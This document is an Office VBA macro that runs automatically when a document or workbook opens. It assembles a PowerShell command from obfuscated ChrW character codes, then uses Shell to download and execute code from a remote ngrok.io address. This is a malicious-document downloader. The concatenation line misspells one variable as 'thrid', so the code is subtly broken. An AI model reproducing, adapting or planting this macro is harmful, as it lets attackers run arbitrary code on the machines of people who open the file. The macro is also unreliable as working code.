Sub Auto_Open()
Dim first As String
Dim second As String
Dim third As String
Dim fourth As String
Dim fifth As String
Dim sixth As String
Dim seventh As String
Dim eighth As String
Dim ninth As String
Dim tenth As String
Dim last As String
Dim lastlast As String
first = ChrW(112)&ChrW(111)&ChrW(119)&ChrW(101)&ChrW(114)&ChrW(115)&ChrW(104)&ChrW(101)&ChrW(108)&ChrW(108)
second = ChrW(46)&ChrW(101)&ChrW(120)&ChrW(101)&ChrW(32)&ChrW(34)&ChrW(73)&ChrW(69)&ChrW(88)&ChrW(32)
third = ChrW(40)&ChrW(40)&ChrW(110)&ChrW(101)&ChrW(119)&ChrW(45)&ChrW(111)&ChrW(98)&ChrW(106)&ChrW(101)
fourth = ChrW(99)&ChrW(116)&ChrW(32)&ChrW(110)&ChrW(101)&ChrW(116)&ChrW(46)&ChrW(119)&ChrW(101)&ChrW(98)
fifth = ChrW(99)&ChrW(108)&ChrW(105)&ChrW(101)&ChrW(110)&ChrW(116)&ChrW(41)&ChrW(46)&ChrW(100)&ChrW(111)
sixth = ChrW(119)&ChrW(110)&ChrW(108)&ChrW(111)&ChrW(97)&ChrW(100)&ChrW(115)&ChrW(116)&ChrW(114)&ChrW(105)
seventh = ChrW(110)&ChrW(103)&ChrW(40)&ChrW(39)&ChrW(104)&ChrW(116)&ChrW(116)&ChrW(112)&ChrW(58)&ChrW(47)
eighth = ChrW(47)&ChrW(56)&ChrW(54)&ChrW(55)&ChrW(54)&ChrW(49)&ChrW(48)&ChrW(52)&ChrW(53)&ChrW(50)&ChrW(100)
ninth = ChrW(51)&ChrW(97)&ChrW(46)&ChrW(110)&ChrW(103)&ChrW(114)&ChrW(111)&ChrW(107)&ChrW(46)&ChrW(105)&ChrW(111)
tenth = ChrW(47)&ChrW(101)&ChrW(120)&ChrW(97)&ChrW(109)&ChrW(112)&ChrW(108)&ChrW(101)&ChrW(47)&ChrW(115)&ChrW(117)
last = ChrW(109)&ChrW(97)&ChrW(46)&ChrW(101)&ChrW(120)&ChrW(101)&ChrW(39)&ChrW(41)&ChrW(41)&ChrW(34)
lastlast = first + second + thrid + fourth + fifth + sixth + seventh + eighth + ninth + tenth + last
Shell (lastlast)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub